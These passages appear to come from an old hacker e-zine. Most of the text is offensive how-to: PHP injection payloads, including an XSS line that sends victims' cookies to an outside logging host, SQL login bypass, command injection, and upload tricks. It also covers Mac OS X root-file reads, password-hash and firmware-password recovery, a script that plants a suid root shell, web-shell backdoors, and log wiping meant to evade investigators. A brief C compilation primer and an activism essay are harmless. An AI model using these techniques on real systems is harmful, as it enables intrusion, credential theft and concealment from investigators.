at the end of your input which will cause include to\r\nignore the extension. ex: include.php?file=../../../../../etc/passwd%00 \r\n\r\ncross site scripting\r\n--------------------\r\nWhen a script takes input and sends it back to thebrowser without sufficient\r\nvalidation, you could inject javascript code that lets you interact with the\r\nuser's browser.\r\n\r\n<?php echo \"Hello, $name\"; ?>\r\n\r\nshowname.php?name=freeme<script>alert(document.cookie);</script>\r\n\r\nThis would make an alert box displaying the cookies for the given domain to the\r\nuser. If this is vulnerable, it's also very likely that you could craft a URL\r\nthat redirects the user to an offsite URL that logs the user's cookie for later\r\nretreival through something like...\r\nshowname.php?name=freeme<script>window.navigate(\"http://www.somehost.com/\r\ncookiesteal.php?thegoods=\"+document.cookie)</script>\r\n\r\n...where cookiesteal.php would log all incoming requests and the contents of\r\n'thegoods'. Many web scripts use cookies to store authentication information,\r\nwhich you could use on the original site either by saving the values of these\r\ncookies as your own, cracking passwords, etc.\r\neval\r\nEval allows you to execute PHP code from a string. If you do not sanitize input\r\nbefore it is passed to this function, it can potentially be manipulated to\r\nexecute PHP code. A statement like eval(\"\\$message = \\\"$var\\\";\");  could be\r\nmanipulated like asdf.php?var=\".passthru('cat%20/etc/passwd').\"\r\n\r\nsql injection\r\n-------------\r\nThere are many complexities that vary with the SQL server you are dealing with\r\nas well as the configuration of the web server. In most cases, PHP is used with\r\nMySQL is more secure than something like Microsoft SQL server. Regardless of\r\nwhat server they use, if the coder does not check input before it is passed to\r\nan sql statement, you could possible extract data from their database or bypass\r\nlogin prompts. Consider the following authentication system:\r\n\r\n$result = mysql_result(\"SELECT * FROM users WHERE username='$username' AND\r\npassword='$password\")\r\nif (mysql_numrows($result) == 1) {\r\n  echo \"login success...\";\r\n} else {\r\n  die(\"Error! \" . mysql_error());\r\n}\r\n\r\nIf the variables $username and $password are not checked for bad input, one\r\ncould enter the following into both the variables and trick the login prompt\r\ninto thinking he entered a valid login:\r\nlogin.php?username=' OR 'a'='a&password=' OR 'a'='a\r\n\r\nThe new SQL query would look something like **SELECT * FROM users WHERE\r\nusername='' OR 'a'='a' AND password='' OR 'a'='a'** in which case it doesn't\r\nmatter what the username or password is, the character 'a' will always be equal\r\nto 'a', which would log you in as the first user in the database. You could also\r\nmodify username slightly to allow you to choose the user if you know the name of\r\nthe field in the database: ' OR 'a'='a' AND username='kevin mitnick\r\n\r\nMany times a script will have magic quotes on or use the PHP functions\r\naddslashes/removeslashes before passing input to the query. In this case,\r\ncharacters like ' will automatically be escaped into \\', which MySQL will\r\nunderstand as part of a string and not a special SQL statement.\r\n\r\nThere are also ways of extracting data from the database if a script passes\r\npoorly validated data to a SELECT query. Consider the following script:\r\n\r\n$result = mysql_result(\"SELECT * FROM products WHERE category=$category\");\r\nwhile ($i < mysql_numrows($result)) {\r\n  $data = mysql_fetch_row($result);\r\n  echo \"Product name: $data[0] Product price: $data[1]<br>\";\r\n}\r\n\r\nMySQL has the ability to join several SQL queries into one result set. In the\r\nabove example, you could craft a URL which would allow you to grab data from\r\nanother table and return it with the same results as the products table. \r\n\r\nproducts.php?category=-1 UNION SELECT username, password FROM users WHERE\r\nusername='admin'\r\n\r\nIn order to pull something off like this, it would require you to know the exact\r\nfields and table names. If it was a Microsoft SQL server, you could query\r\nINFORMATION_SCHEMA to get information about the database structure. This\r\ntechnique also requires that the first and second query have the same number of\r\ncolumns. Often times you could figure this out by trying somethign like SELECT\r\n1, 2, 3 FROM tablename ... SELECT 1, 2, 3, 4, 5, 6, 7 from tablename... etc. to\r\nfind the right number of columns that will match. Often times the types of\r\nfields returned also have to match, in which case you could either stick raw\r\nintegers or characters to test and find which fields are which(SELECT 1, 2, 'a',\r\na', 3, 'a', 4, 5 FROM). Generating errors from SQL will often times reveal\r\nimportant information about the names of tables and fields as well as how\r\nspecific queries are structured in the programmer's code.\r\n\r\nSQL injection is a complex trick that requires quite a bit of research and\r\npractice to master well outside the scope of this small introduction. Most of\r\nthe time, every system will be different and every individual programmer will\r\ncraft their SQL statements differently and not use such obvious table and field\r\nnames. There are a number of well written whitepapers about all sorts of\r\ntechniques in which I would suggest for further reading. Many of the realistic\r\nchallenges on HackThisSite.org also provide a place for you to legally practice\r\nthis technique on real systems set up with intentional php/mysql flaws.\r\n\r\nsystem, exec, passthru\r\n----------------------\r\nThese functions execute UNIX commands, which obviously pose a threat if input is\r\npassed to these functions without sufficient validation. For example, if a\r\nscript does something like passthru(\"cal $inputyear\"), expecting input to be an\r\ninteger year so that it can display the calendar, you can inject a value like\r\n\"2001; ls\" and get a directory listing. This is possible because you can execute\r\nseveral UNIX commands in one line by seperating them with a semicolon. You can\r\nalso try working with several other commandline goodies, like `cat /etc/passwd`\r\nwhich will dump the output of any command between the ``s, or | which will let\r\nyou pump output from one program into another, or > and >> which will let you\r\ndump output from a command into a file.\r\n\r\nfile uploading\r\n--------------\r\nOften times scripts will present you with a form that will allow you to pick a\r\nfile off of your hard drive and upload it to their website. There are a few\r\ntricks you could try this that might allow you to upload files in other\r\nlocations with other names, potentially allowing you to overwrite files or\r\nupload PHP files which may allow you to gain the ability to execute commands as\r\nthe web server.\r\n\r\nIf you're lucky, they won't do any sort of authentication that makes sure you\r\nare uploading files of a specific type. If this is the case, you can upload a\r\nPHP file without any trouble and be able to do anything you want to do. Most of\r\nthe time they will at the least check for file extensions in which case there\r\nmay be some workarounds. Often times if it is a media upload it will check for\r\nthe presence of 'jpg', 'jpeg','gif', etc. You might want to try uploading a file\r\ncalled jpg.php. If they allow uploads of any kind of file EXCEPT for blacklisted\r\nextensions, check to see if they allow you to upload php, php3, phtm, phtml,\r\nphps, perl, pl, cgi, asp, aspx, jsp, or any other sort of server side scripting\r\nlanguage. \r\n\r\nThere are also several different vulnerabilities in PHP itself allowing users to\r\nupload files as any name in any location that the web server can write to. This\r\nis only capable of the name of the $_FILES variable has an underscore(_)\r\ncharacter. You can forge your own HTTP request and set the name of the file\r\nthrough Content-Type: ../../path/to/newfilename.html to ignore the\r\nfilename=\"somefile.html\" which usually defines the name of the file. This\r\npotentially allows you to upload PHP files, gaining the permissions of the web\r\nserver.\r\n\r\nAnother vulnerability in PHP allows you to bypass their measures to prevent path\r\ntransversal. If you upload a file with a single quote(such as ..'filename.html),\r\nPHP will escape the quote into a /' AFTER it sanitizes the input, resulting in\r\nthe final name of ../'filename.html. If there isn't sufficient input validation\r\nand if the web server has write permissions, this will potentially allow you to\r\nupload files one directory up. This affects PHP 4.3.6 to 4.3.9.\r\n\r\nGeneral Misconfigurations\r\n-------------------------\r\nOften times a web developer will be careless and make mistakes which might\r\nreveal configuration files or logins. Often a php file will be named something\r\nother than .php which will cause the web server to output the raw source to you\r\ninstead of parsing it for PHP code before output. This can also happen when\r\nbackups are made by copying a file as config.inc.php.bak or so forth, which\r\nmight reveal login or mysql information.\r\n\r\nIt is also a good idea to check out all directories on a system that do not have\r\nan index page to see whether the web server is configured to give you a\r\ndirectory listing, which in some cases might give you access to sensitive\r\ninformation about the server or organization.\r\n\r\nIf you have the ability to read files off their machine, you might want to try\r\nreading configuration files for their PHP scripts or the server as a whole. If\r\nthey are using common software, try downloading the source from the developers\r\nwebsite, find the name of the configuration file, and try reading the targets to\r\nreveal mysql u/p or more. If you can read outside of the web directory, also try\r\nreading httpd.conf, ftp conf files, user .bash_history files, my.cnf,\r\n.htacesses, etc (or boot.ini, sam, config.sys, etc on a windows machine). A\r\ndeveloper may even be as silly to leave default logins and passwords when\r\nconfiguring a ready to go PHP script.\r\n\r\n################################################################################\r\n#                       10.

Even though this was patched a while ago,\r\nthere's still several ways to be able to recover user passwords. Mac OS X does\r\nnot store passwords in an /etc/shadow or /etc/master. passwd file. However,\r\nthere is a way you can recover password hashes for all users.\r\n\r\nMac OS X uses NetInfo to handle user accounts. The password hashes on an OS X\r\nbased system are stored in /var/db/shadow/hash/(guid). Each user has its own\r\nhash file. To get a list of users and their corresponding generated uid(guid),\r\ntry:\r\nlocal: user$ nireport / /users name generateduid uid | grep -v NoValue \r\nadmin 559DBF44-4231-11D9-A5A8-00039367EBAE 501 \r\norb 5D97A400-5045-11D9-AFEB-00039367EBAE 502 \r\ntest C82D45B7-6422-11D9-853D-00039367EBAE 503 \r\n\r\nSo the password for the \"admin\" user is stored in\r\n/var/db/shadow/hash/559DBF44-4231-11D9-A5A8-00039367EBAE. Now this file can be\r\nread only as root. Of course, there are a few tricks we can try that allow you\r\nto read these files. But let's say that you have root access for now.\r\n # cat /var/db/shadow/hash/559DBF44-4231-11D9-A5A8\r\n 00039367EBAE 209C6174DA490CAEB422F3FA5A7AE634F0D412BD764FFE81AAD3B435B5\r\n1404EED033E22AE348AEB5660FC2140AEC35850C4DA997 \r\n\r\nThis large string contains two seperate hashes for the same password. The first\r\n64 characters form the SMB hash(which is used for Windows file sharing, even if\r\nit is not turned on) which is actually two 32 character MD4 hashes put together.\r\nThe last 40 characters form the SHA1 hash. Once you have recovered this file,\r\nall that remains is to properly format this file and run it through a password\r\ncracker like John the Ripper or Lepton's Crack. \r\n\r\nSMB hashes:\r\nadmin:209C6174DA490CAEB422F3FA5A7AE634:F0D412BD764FFE81AAD3B435B51404EE\r\norb:6FFB224FB592476B2230862E220937DA:4B881A967FE694FBAAD3B435B51404EE\r\ntest:0CB6948805F797BF2A82807973B89537:01FC5A6BE7BC6929AAD B435B51404EE\r\n\r\nSHA1 hashes:\r\nadmin:D033E22AE348AEB5660FC2140AEC35850C4DA997\r\norb:23119F5947DA61A815E7A1CC2AF9BDB8C19CAF1F\r\ntest:A94A8FE5CCB19BA61C4C0873D391E987982FBBD3\r\n\r\n--------------------------------------------------------------------------------\r\nReading Files as Root through /usr/bin/at\r\n--------------------------------------------------------------------------------\r\nThere is a vulnerability in /usr/bin/at that allows you to read files as root.\r\nThis implications of this can be devestating if you already have local\r\nunprivileged access. Using this trick, you can read a variety of sensitive files\r\nincluding user password hashes, temporary swap files, .bash_history files, etc.\r\n\r\nThis will allow you to read a list of commands executed by the \"admin\" user:\r\nlocal: user$ id\r\nuid=503(test) gid=503(test) groups=503(test)\r\nlocal: user$ ls -al /users/admin/.bash_history\r\n-rw------- 1 admin staff 1259 12 Sep 2003 /users/admin/. bash_history\r\nlocal: user$ cat /users/admin/.bash_history cat: /users/admin/.bash_history:\r\nPermission denied\r\nlocal: user$ at -f /users/admin/.bash_history now+1minute\r\nJob a011afa33.000 will be executed using /bin/sh\r\nlocal: user$ cat /var/at/jobs/a011afa33.000\r\n(the contents of /users/admin/.bash_history)\r\n\r\nAs long as you have local access to the machine, you can read the hash files for\r\nall users using this vulnerability:\r\n\r\nat -f /var/db/shadow/hash/559DBF44-4231-11D9A5A8-00039367EBAE now+1minute\r\n\r\nThis was patched with the January 25, 2005 security update available from Apple. \r\n--------------------------------------------------------------------------------\r\nSensitive Swap Files\r\n--------------------------------------------------------------------------------\r\nThere is another technique for recovering passwords making use of temporary swap\r\nfiles. Several components including FileVault, Keychain, login, and others store\r\nall sorts of sensitive data in these swap files located in /var/vm/. These are\r\nhuge files and it takes some clever unix commands to be able to extract anything\r\nuseful out of them. However, often times the above applications will store\r\nusernames and passwords in plain text.\r\n\r\nTry this on your home machine(making sure to also try swapfile1, swap-file2,\r\netc) \r\n\r\n# strings -8 /var/vm/swapfile0 | grep -A 4 -i longname\r\n\r\nThis will only recover passwords from people who had sat down and actually used\r\nthe system with their user account. Every time the machine restarts, these\r\nswapfiles are cleared, so the longer a machine had been running the better\r\nchance you have with recovering passwords.\r\n\r\nOf course, these files are read only by root. You can also use the \"at\"\r\nvulnerability above to copy these swapfiles to a temporary location and then use\r\nthe above command to parse those files. \r\n--------------------------------------------------------------------------------\r\nTricking Software Update\r\n--------------------------------------------------------------------------------\r\nMac OS X has a handy tool called Software Update which automatically checks for\r\nsoftware patches and security updates. Many of the tricks in this document had\r\nalready been patched. Fortunately, if you have access to a machine you can trick\r\nSoftware Update into thinking that you have already installed specific updates. \r\n\r\nCheck out the contents of /Library/Receipts/. Create a file with the same name\r\nas an update package and Software Update won't list that particular package.\r\n\r\n--------------------------------------------------------------------------------\r\nRecover Open Firmware Password\r\n--------------------------------------------------------------------------------\r\nMany public computers, especially commercial cyber cafes, use special security\r\nsoftware or tracking mechanisms that prevent you from doing certain activities\r\nor even require you to pay by the hour. Ordinarily, you would be able to restart\r\nthe computer into Open Firmware and either use single user mode to mess with the\r\nsystem or just boot to an external device like the copy of Mac OS X you\r\ninstalled on your iPod. Unfortunately,more and more computers are starting to\r\npassword protect Open Firmware which requires you to authenticate before you do\r\nany of these things.\r\n\r\nThis is beatable. If you have root access in terminal, try typing nvram\r\nsecurity-password. This should spit out a string which is the open firmware\r\npassword encoded in xor hex. It is NOT encrypted, it is simply obfuscated. \r\n\r\nnvram security-password\r\nsecurity-password: %d9%df%da%cf%d8%d9%cf%c1%d8%cf%de\r\n\r\nThe MacSIG group at University of Michigan wrote a C script to be able to\r\ngenerate strings to be used as the open firmware password:\r\nhttp://macosx.si.umich.edu/files/ofpwgen.c\r\n\r\nUsing this you should be able to generate strings to match with the password\r\nfound by nvram security-password. You can also use this chart as a reference: \r\n\r\nnvram security-password\r\na  b  c  d  e  f  g  h  i  j  k  l  m \r\n%cb%c8%c9%ce%cf%cc%cd%c2%c3%c0%c1%c6%c7\r\n\r\nn  o  p  q  r  s  t  u  v  w  x  y  z \r\n%c4%c5%da%db%d8%d9%de%df%dc%dd%d2%d3%d0 \r\n\r\nA  B  C  D  E  F  G  H  I  J  K  L  M \r\n%eb%e8%e9%ee%ef%ec%ed%e2%e3%e0%e1%e6%e7\r\n\r\nN  O  P  Q  R  S  T  U  V  W  X  Y  Z  \r\n%e4%e5%fa%fb%f8%f9%fe%ff%fc%fd%f2%f3%f0\r\n\r\n1  2  3  4  5  6  7  8  9  0  !  @  # \r\n%9b%98%99%9e%9f%9c%9d%92%93%9a%8b%ea%89\r\n\r\n$  %  ^  &  *  (  )  +  =  -  _  }  {  \r\n%8e%8f%f4%8c%80%82%83%81%97%87%f5%d7%d1\r\n\r\nWhen you have this password, you are able to boot into single user mode or\r\nrestart from the operating system stored on your iPod, circumventing any sort of\r\nsecurity mechanism set up by the owners.\r\n\r\n-------------------------------------------------------------------------------- \r\nExploiting Bad Startup Items Permissions\r\n-------------------------------------------------------------------------------- \r\nIf the /Library/StartupItems folder has not already been created, certain\r\nsoftware installers that use this folder may have to create it in order to run\r\nprograms when the machine restarts. These scripts run as root. Very often poorly\r\nwritten software installers will create this folder with bad permissions,\r\nallowing any user to drop files in that directory. One could write a malicious\r\nscript, drop it in that folder, restart the computer, and be able to execute\r\nscripts as root.\r\n\r\nls -al /Library/StartupItems/\r\ntotal 0\r\ndrwxrwxrwx 3  root admin 102  5 Apr 12:15 .\r\ndrwxrwxr-x 39 root admin 1326 6 Apr 09:28 ..\r\n\r\nAs you can see, the directory is chmod 777 - which means we can write files to\r\nit. Make a folder in this directory and write a shell script which the same name\r\nas the directory containing the text:\r\n\r\n#!/bin/sh\r\ncp /bin/sh /etc/.rewt\r\nchown root /etc/.rewt\r\nchmod 4755 /etc/.rewt\r\n\r\nThen make a file called StartupParameters.plist containing the text:\r\n{\r\n Description = \"NameOfScript\";\r\n Provides = (\"NameOfScript\"); \r\n OrderPreference = \"None\"; \r\n}\r\n\r\nNext time you restart the machine, it will execute the shell script you wrote.\r\nThis particular shell script will make a suid root shell in /etc/.rewt. Boom! \r\n\r\n--------------------------------------------------------------------------------\r\nURL Handler Exploits\r\n--------------------------------------------------------------------------------\r\nThere are a number of security issues related to URL handlers in Mac OS X.\r\nThrough these tricks, you are able to execute code on a victim machine just by\r\nloading a link in *any* web browser. There are several varieties of these\r\nexploits based around the same contents and have been patched through a number\r\nof different security updates Apple had released, the latest 2004-06-07 fixing\r\nmost of them. The basic idea is to trick the browser into downloading and\r\nmounting a DMG file and then trying a second trick to actually run code from the\r\nfiles stored in the DMG file.\r\n\r\nThere are a number of ways to be able to mount volumes on victim systems. You\r\ncan prepare an HTML document to automatically redirect you to a certain URL\r\nthrough javascript or a meta refresh tag. By going to\r\ndisk://urlto.com/some/package.dmg, the browser will automatically download and\r\nmount package.dmg. This can also be accomplished through something similar to\r\nftp://, afp://, and even http:// inside of safari.\r\n\r\nThe contents of the DMG file may contain a specially crafted application called\r\nFun.app which can in itself register a new URL handler (let's say malicious://)\r\nthat when called by any browser it will launch Fun.app. Applications can\r\nregister new URL handlers as CFBundleURLTypes tags stored in the\r\nFun.app/Contents/Info.plist or the plist resource fork. Alternatively,you could\r\nalso try help://runscript=../../../Volumes/yourvolume/yourscript.scpt to start\r\nfiles stored on the mounted dmg volume.\r\n\r\nOther interesting URL handlers that can be explored for future vulnerabilities:\r\nx-man-page://, telnet://, ssh://, ical://, addressbook://, itms://, mms://, etc.\r\n\r\n--------------------------------------------------------------------------------\r\nOther Vulnerabilities\r\n--------------------------------------------------------------------------------\r\nThere had been a number of vulnerabilities and exploits discovered for Mac OS X\r\nover the past year.\r\n\r\nCF_CHARSET_PATH local root exploit\r\nExploiting a buffer overflow in Core Foundation, an attacker is able to drop to\r\nroot by injecting malicious code into the CF_CHARSET_PATH environment variable.\r\nThe exploit is publically available and Apple released a patch on March 21,\r\n2005.\r\n\r\nAppleFileServer remote root exploit\r\nA pre-authentication buffer overflow in Apple file sharing allows you to execute\r\nremote commands as root. It affects several different versions of the OS, but\r\nonly the return address and offsets are public for 10.3.3. This was patched by\r\nApple on 2004-12-02.\r\n\r\nBrowser homograph attacks allowed spoofed URLs\r\nBecause of improper International Domain Name support, it is possible to craft a\r\nlink which tricks the browser into appearing like an official site but actually\r\nredirect to somewhere else. Example: http://www.p&#1072;ypal.com/ appears like\r\npaypal.com while it actually goes to www.xn--pypal-4ve.com. This was discovered\r\nby the Schmoo group and patched with the March 21 2005 security update.\r\n\r\nAdobe Version Cue local root vulnerability\r\nOn systems running Mac OS X 10.3.6 or below who has Adobe Version Cue installed\r\n(ships which virtually every Adobe product) allows unprivileged users to drop to\r\na root shell through manipulating suid shell scripts. The script\r\n/Applications/Adobe Version Cue/stopserver.sh does not check to see what\r\ndirectory you are in before it makes references to other shell scripts. You are\r\nable to call stopserver.sh through a symbolic link and execute malicious code as\r\nroot by making a fake productname.sh. You can easily cp /bin/sh to ~, chmod\r\n4755, and chown root. Boom, instant suid root shell.\r\n\r\nmRouter local root exploit\r\nA buffer overflow in a command line argument of the mRouter binary can be\r\nexploited to drop to a root shell. mRouter is SUID by default and comes\r\ninstalled with the iSync packages. This bug was fixed with Mac OS X 10.4 Tiger.\r\n\r\nApple Internet Connect local root vulnerability\r\nApple Internet Connect writes to /tmp/ppp.log, creating it if it does not\r\nalready exist, and appending to it if it already exists. You can trick it into\r\nappending data to any file on the system by creating a symbolic link\r\n/tmp/ppp.log to the file being altered. By adding code to the telephone dialogue\r\nbox, and redirecting /tmp/ppp.log to /etc/daily, you can execute code as root as\r\ncron checks this file everyday at 3:15am. This vulnerability was discovered by\r\nb-r00t and affects versions up to 10.3.4.\r\n\r\n################################################################################\r\n#              11. C Compilation on a Low Level   By Forcemaster               #\r\n################################################################################\r\n\r\nThis article discusses the process behind compiling a C program. the article\r\nwill be split into two sections. The first about low level C compilation and its\r\nworkings, the second will contain some useful C links and some other random shit\r\nthat I might decide to throw in there. So read on...\r\n\r\nThe first part of the compilation process is the preprocessor. The preprocessor\r\naccepts source code as input and is responsible for removing componenets and\r\nintepreting preprocessor directives (such as #defines and macros, and anything\r\nelse with # at its start for that matter). The next stage in compilation is the\r\ncompiler. All this does is translate the source code sent to it from the\r\npreprocessor to assembly code. Very good. Next. The assembler comes next, it\r\ncreates object code. The last step in C compilation is the linker editor, which\r\nadds libraries, and external functions to the main() function, it also resolves\r\nany external variables. After this has been done, an executable file is\r\nproduced. The Preprocessor. A unique feature to C compilers is that the\r\npreprocessor is always the first step in compilation. The preprocessor kind of\r\nprovides its own mini-language, as it were. Using the preprocessor has several\r\nadvantages, which I'm not going into here as this is not a C tutorial. It\r\ninterperates all processes begining with a \"#\" (hash) sign. Now it'll go through\r\nhow it does this with some preprocessor direvtives.\r\n\r\nThe most common preprocessor directive is \"#include\", when an #include statement\r\nis issued like \"#include <file>\" the preprocessor will look in the directory\r\nwhere system header files are usually kept. Normally /usr/include on *nix\r\nsystems. When an #include statement is issued like \"#include 'file'\" the\r\npreprocessor will look in the current for the header file. The preprocessor\r\ndirective #define is nothing but a text substitution. #define also can be used\r\nto make macros, which are basically mini-functions, in this way the preprocessor\r\ncan be very powerful. The next stage in C compilation is the compiler, which\r\ntranslates the code into assembly. It recieves the source code from the\r\npreprocessor.\r\n\r\nThe assembler is next, which creates object code. Object code contains compact,\r\npre-parsed source code. Usually called binaries. An object file (a file\r\ncontaining object code) is mostly machine code. WHich is code directly\r\nunderstood by the machine processor. Object code has a .o suffix on *nix systems\r\nand usually .obj on windows system. Object code can be linked with other\r\nlibraries to create a final executable. Finally is the linker or link editor.\r\nThe linker takes various object files and assembles them into an executable\r\nfile. Linkers can also include object files from external libraries. This has\r\nadvantages over including a single large object file such as making faster\r\ncompilation time, and more managable code. Most compilers will automatically\r\nlink with several defualt system libraries during compilation. After all these\r\ncompilation steps you should be left with a finished executable file. Most\r\ncompilers have a nice syntax checker that will stop compiling if a syntax error\r\noccurs, although occasionaly errors do occur that are not picked up by the\r\ncompiler.\r\n\r\nSamHallam@gmail.com (Forcemaster)\r\n\r\nhttp://ctour.tonymantoan.net -- Absouletly fucking awesome C tutorial for\r\nbegginers.

Security Access, Backdoors and Gaining Permissions              #\r\n################################################################################\r\n\r\nWoah! I just found this bug on this web server that lets me run commands as the\r\nweb server. This is cool! Too bad I only have permissions as the web user. What\r\ndo I do now? No doubt you've left some pretty nasty trails all over the web\r\nserver, and you're probably not satisfied with the access level of what you have\r\nright now.\r\n\r\nThis guide will show you some tricks on how to secure your access, elevate\r\npermissions, set up backdoors, and clean up after your tracks. Comprimising\r\nmachines and chaining several secure jump boxes to route your connections allows\r\nyou to be virtually anonymous, especially if you use a public unmonitored\r\ninternet connection.\r\n\r\nIf you've found an exploit, one of the first things you might want to do is\r\nprobably find a way to make sure you'll always have access, even if they\r\ndiscover and patch the vulnerability. In every system, you could copy files to\r\n/tmp/ which gives you some file space that you can play around with, but unless\r\nyouput it in the web root, you won't be able to access your files from the web\r\nserver. You can try to find a dir you can write to through a find ../../../\r\n-type d -perm 777 where ../../ is the path to the web root base. This will spit\r\nout a list of directories that you can copy a backdoor to. You should then make\r\na hidden directory .page where you will put all your files. Then you can use a\r\ntool look curl or wget to copy a PHP or ASP exec backdoor(like funtimes.php on\r\nthe right) to this directory. If neither of these tools are available, or if the\r\nserver is behind some sort of firewall, then you could also echo \"<?php\r\nthesourcecode; ?>\" > /path/to/www/root/.page/backdoor.php.\r\n\r\nThis will give you a web based shell, which is a good start,but has a number of\r\ndisadvantages. Every time you execute a command, a little entry in their\r\naccess-log notes your IP address and the URL to the backdoor. In addition, this\r\nwill not let you execute interactive programs like ftp or vi because of the\r\nnature of the web. So it's obvious you need something a bit more.\r\n\r\nYou might want to read about some configuration files to see if you could gain\r\nfurther access or at least gather information about the machine. Try the\r\nhttpd.conf file or any .htaccess files, often times it will continue\r\nAuthUserFile statements which have paths to the password files for password\r\nprotected directories. These files are usually DES or MD5 encrypted which can be\r\ncracked, and usually give access to admin sections that may allow uploads or\r\nways to interact with their database. You can also try reading /etc/passwd to\r\nfind usernames on their system, as well as proftp.conf, my.cnf, pam.conf, or\r\nothers. If they have scripts that make use of MySQL, look around for some\r\nconfiguration files to see if you can find any u/p. Try config.php for phpBB or\r\nconfig.inc.php for phpMyAdmin. Often times if they are silly enough they will\r\nuse the same logins information as ftp or ssh. If you cannot get a shell login\r\nthis way, then you might want to see if you could bind a port to the shell to\r\ntelnet to and use interactive programs. This will help when navigating the\r\nsystem and trying other exploits.\r\n\r\nIf this by itself doesn't give you access, you're going to have to see if there\r\nare any exploits on the system to gain further access. Try a uname -a, ps -aux,\r\nand a nmap to see what sort of services are running on this machine that could\r\nbe exploited. Look for suid binaries on a system: find / -perm -4000 -o -perm\r\n-2000 -exec ls -ldb {} \\; . Look through k-otik.com, milw0rm.com,\r\nsecurityfocus.com, and others to see if there are any local root exploits for\r\nthis system. No system is entirely secure, especailly if the system is old or\r\nunpatched, there's probably dozens of ways to get root, but it is outside the\r\nscope of this article.\r\n\r\nNow that you've got complete control of the machine, there's a billion things\r\nyou can do to secure access and cover your tracks. Add new users with uid 0 for\r\nsame permissions as root. Create a C file that and chmod it 4755 so that it runs\r\na /bin/sh shell as root(see suidshell.c below). Bind a port to a shell running\r\nas the root user so you can hop on without leaving any messy logs anywhere. If\r\nyou really want to get fun, you can backdoor several system binaries including\r\nw, who, ps, ls, and even login to hide your trails in a system. There are all\r\nsorts of rootkits that automate the process.\r\n\r\nClearing the logs of a system could mean the difference between a federal\r\ninvestigation and getting away with the penetration. Every system stores its\r\nlogs in different locations and often times system administrators will back\r\nfiles up to different locations. For starters, wipe everything inside of\r\n/var/log. If you gain access through a flaw in the web server, make sure you\r\nalso clear all apache access or error logs. Usually you can find the locations\r\nof this through reading the httpd.conf file. Clear the .bash_history file for\r\nall users to destroy your command history(starting an ssh session with an unset\r\nHISTFILE command will disable this logging). There are also prewritten scripts\r\nlike zap3.c which help automate the process of clearing logs or even stripping\r\nall specific ip addresses without completely trashing logs and becoming noticed.\r\nRemember, deleting a file is not enough, you want to shred the files with random\r\ndata to slow forensics.\r\n\r\nThis should give you an introduction of some directions you can take a system if\r\nyou've already got some level of access.

Join Revolution, Live Happier   by r3d5pik3                 #\r\n################################################################################\r\n\r\nSo you're tired of wasting your life away behind a screen, or maybe your not\r\nsatisfied with the way things are going around you. You're constantly looking\r\ndeep down for more in life, more meaning, more excitement. You want to make a\r\ndifference, and you want to have a good time doing it. So what better way then\r\nto get active in your community?\r\n\r\nNow when you hear the words revolution, and activism, a couple things that may\r\ncome to mind: protesting, rioting, tree hugging, stealing, and sometimes even\r\narson. Well that is undoubtedly how the media portrays activists. However this\r\nmass depicted stereotype is extremist, and somewhat falsified. Becoming an\r\nactivist has absolutely nothing to do with carrying a picket sign, breaking\r\nstuff in the streets, and setting stuff on fire  (not saying that those things\r\naren't fun ;) ). It is about about making changes  to system, but not via the\r\ndrastic methods you see televised. As a matter of fact, revolution will not, and\r\ncan not be televised. Activists utilizing the system to destroy the system never\r\nhas, and never will work out. So true activism takes effect at a local level. It\r\nis here at this local level were individuals have the biggest impact on the\r\nworld.\r\n\r\nSo now that we got your windows cleaned from media missrepresentation, and you\r\nsee the bright rays of activism glaring at you. There are all sorts of ways to\r\nintegrate radical ideas into your everyday life: \r\n\r\n1.) Turn off the television\r\n--------------------------------------------------------------------------------\r\nTV is the centrifuge of most things corporal. Chances are you, or some one you\r\nknow works for some one directly, or indirectly involved with this form of mass\r\nmedia (broadcast, the phone company, coke, coffee shops, or the gym they all\r\nadvertise don't they?). Besides that, wouldn't you rather be living an adventure\r\nof your own, instead of watching one unfold before you on a screen? Go shake\r\nstuff up with your friends, meet new people, go on adventures, just please turn\r\nthe TV off. \r\n\r\n2.) Fall in love\r\n--------------------------------------------------------------------------------\r\nYes this is an activist act. Some one in love has more to live for, more\r\nexcitement, and more meaning in there life. Some one in love has less place in\r\nthe corporal elite ranks and more in the living life for the moment spectrum. So\r\nfall in love today. fall in love with a guy, a girl, an activity, anything it\r\nreally doesn't matter just find more to live for. \r\n\r\n3.) Read a book\r\n--------------------------------------------------------------------------------\r\nEspecially books that make you question things around you, ones that get you to\r\nthink. Books full of action, puzzles, mystery, tragedy, whatever its all good. \r\n\r\n4.) Start conversations with strangers\r\n--------------------------------------------------------------------------------\r\nStarting a conversation with some one you have never seen before in your life is\r\na great exercise to break down the socialphobia that the system breeds us on.\r\nAlso in the act of doing this you make the world a some what friendlier place to\r\nlive in, by breaking down the social walls that keep us all isolated, distant,\r\nand forgotten. This alone is all we need to rekindle the flame of our\r\ncommunities. \r\n\r\n5.) Use alternative transportation\r\n--------------------------------------------------------------------------------\r\nUse public transportation whenever possible. Get some exercise by, riding a\r\nbike, jogging, walking, or skating. Either of these options will both break down\r\nsome social barriers, conserve fossil fuels, keep you a healthier person. \r\n\r\n6.) Go to local band/music shows\r\n--------------------------------------------------------------------------------\r\nThese are usually cheap and are jam packed with fun. What better way to get the\r\ncommunity together, while having a good time listening to your favorite local\r\nband? If you do choose to go to these events, don't let them be a spectator\r\nsport. What I mean is please don't just stand around and stare at the bands. Get\r\nsocial, party, live it up, and shake things up a bit. \r\n\r\n7.) Call in sick on a sunny day\r\n--------------------------------------------------------------------------------\r\nCalling in sick on a sunny day is an exploit people simply don't take advantage\r\nof enough. Everyone deserves a day off every once in a while, and this would be\r\nthe perfect time to go explore a part of your town you've never seen before,\r\ninteract with new people, and just have fun. \r\n\r\n8.) Let your artistic side out\r\n--------------------------------------------------------------------------------\r\nBreak free from your systematic lifestyle by writing a poem, sketching something\r\nup, writing song lyrics, composing music, or writing a story. Anything that gets\r\nthe creative juices flowing and gets you thinking somewhat out of the norm. \r\n\r\n9.) Spend less, Work less, live more\r\n--------------------------------------------------------------------------------\r\nBuy only the absolute essentials you need to live. Make sure everything you buy,\r\nyour buying it because you need it. Not because advertisers make you feel\r\ninsecure to buy there product.. If you do this, then you will need less income.\r\nThe less income you need the less you need to work. The less you need to work\r\nthe more time you have to put your energy to something productive and fun you\r\nbelieve in. \r\n\r\n10.) Get organized !\r\n--------------------------------------------------------------------------------\r\nOrganize meaningfull fun events in your neighborhood. Throw a community potluck.\r\nHave a community barbecue where everyone brings something. Organize spoken word,\r\nand music related events for people to come together and express themselves.\r\nOrganize your own workers union if you don't have one. Organize charities,\r\nnon-profit organizations, anything really. Start your own projects as long as\r\nyou see them as a productive thing then thats really all that 